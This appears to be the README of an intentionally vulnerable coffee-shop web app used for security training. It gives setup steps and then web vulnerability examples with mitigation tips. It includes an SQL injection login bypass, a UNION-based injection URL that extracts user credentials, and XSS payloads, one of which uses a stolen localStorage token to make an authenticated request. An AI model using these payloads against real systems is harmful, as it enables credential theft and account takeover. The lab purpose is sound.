# ✅ Getting Started

### API
Go into the api folder and run:
```
npm i
node app.js
```
### Frontend
Go to coffee-shop folder and run:
```
npm i
npm run build
```

### Nginx
Configure nginx with the following configuration:

```
server {
    listen 80;
    server_name localhost;  # Replace with your domain if needed
    location /api {
        proxy_pass http://localhost:3000;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }
    location / {
        root /path/to/react/dist;  # Change this if your frontend is built elsewhere
        index index.html;
        try_files $uri /index.html;
    }
}
```


# 🔐 Web Security Vulnerabilities & Exploits

## 1️⃣ SQL Injection (SQLi) 💉  
### 🔹 Login Bypass & Parameterized Query  
```sql
-- Example of SQLi in login
SELECT * FROM users WHERE username = 'test' and password = '' or ''=''

-- Vulnerable query
SELECT * FROM users WHERE username = '${username}' and password = '${password}'

-- SQLi Payloads
username -> test'--
password -> dsafsdfsdf

-- Final Query After Injection
SELECT * FROM users WHERE username = 'test\'--' and password = 'dsafsdfsdf'
```
### 🔹 Full Database Access  
```sql
-- Exploiting UNION-based SQLi
SELECT * FROM coffee WHERE id = 2--
```
```text
http://localhost/api/coffee/22+union+select+(select+concat(username,':',password)+from+users+limit+2,1),2,3,4--
```

- ❌ Do not allow arbitrary user input in SQL queries
- ✅ Use parameterized query

---

## 2️⃣ Cross-Site Scripting (XSS) ❌  
### 🔹 Types of XSS  
- **Reflected XSS**
- **Stored XSS**  

### 🔹 HTML Injection  
```html
<div style="background-color: white; position: absolute; top:0; left:0; width: 100%; height: 100%;">
    hello
</div>
```

### 🔹 Script Injection  
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)/>
```
```html
<img src=x onerror="fetch('http://localhost/api/profile/update',{
    method:'POST',
    headers:{
        'Content-Type':'application/json',
        'Authorization': `Bearer ${localStorage.getItem('token')}`
    }, 
    body: JSON.stringify({name:'haha'})
})"/>
```

### 🛠 XSS Practice Platforms  
- [XSS Quiz](https://xss-quiz.int21h.jp/)  
- [HackXpert XSS Playground](https://labs.hackxpert.com/XSS_Playground)  
- [Google XSS Game](https://xss-game.appspot.com/)  


❌ Do not render HTML directly from user input

---

## 3️⃣ Cross-Site Request Forgery (CSRF) 💀  
- Use `csurf` middleware  
- Implement CSRF Tokens  

---

## 4️⃣ Insecure Direct Object Reference (IDOR) 🔑  
- ❌ **Never take `user_id` from request**  
- ❌ **Never expose sensitive IDs in responses**  
- ✅ **Use UUIDs instead of sequential IDs**  

---

## 5️⃣ Open Redirection 🔄  
- Validate and whitelist redirects to avoid phishing attacks  

---

## 6️⃣ Broken Authentication 💔🔑
- **Do not rely on client-side validation**  

---

## 7️⃣ Brute Force Attacks 🛑  
- Implement **rate limiting** using `express-rate-limit`  

---
